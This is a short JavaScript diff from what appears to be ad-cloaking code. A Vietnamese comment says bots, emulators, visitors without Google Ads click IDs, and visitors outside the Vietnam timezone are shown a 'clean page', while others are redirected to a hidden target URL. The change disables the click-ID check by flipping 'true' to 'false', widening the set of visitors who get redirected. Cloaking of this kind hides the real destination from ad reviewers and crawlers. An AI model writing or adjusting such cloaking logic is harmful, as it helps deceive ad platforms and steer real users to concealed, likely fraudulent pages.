@@ -263,7 +263,7 @@
         performRedirect(false);
       };
 
-      if (isBot || !targetUrl || (true && !hasValidAdClickId()) || !isVietnamTimezone()) {
+      if (isBot || !targetUrl || (false && !hasValidAdClickId()) || !isVietnamTimezone()) {
         // Bot, giả lập, chưa có Tracking Link, không có mã click Google Ads (gclid/wbraid/gbraid/gad_source+gad_campaignid), hoặc lệch múi giờ VN -> 100% Trang Sạch
         showSafePage();
       } else {
